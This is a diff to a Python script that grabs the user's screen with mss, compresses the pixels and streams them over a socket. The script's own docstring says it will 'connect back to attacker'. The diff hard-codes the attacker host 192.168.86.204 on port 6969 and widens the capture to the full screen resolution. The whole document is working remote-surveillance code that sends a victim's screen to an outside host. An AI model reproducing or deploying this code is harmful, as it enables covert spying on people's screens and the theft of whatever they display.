@@ -3,11 +3,15 @@ from threading import Thread
 from zlib import compress
 from mss import mss
 
+import ctypes
+user32 = ctypes.windll.user32
+screensize = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
+print(screensize)
 
 import pygame
 
-WIDTH = 500
-HEIGHT = 500
+WIDTH = screensize[0]
+HEIGHT = screensize[1]
 
 def retreive_screenshot(conn):
     with mss() as sct:
@@ -32,7 +36,7 @@ def retreive_screenshot(conn):
             # Send pixels
             conn.sendall(pixels)
 x = socket.socket()
-def main(host='Your Server IP', port=6969):
+def main(host='192.168.86.204', port=6969):
     ''' connect back to attacker on port'''
     sock = socket.socket()
     sock.connect((host, port))
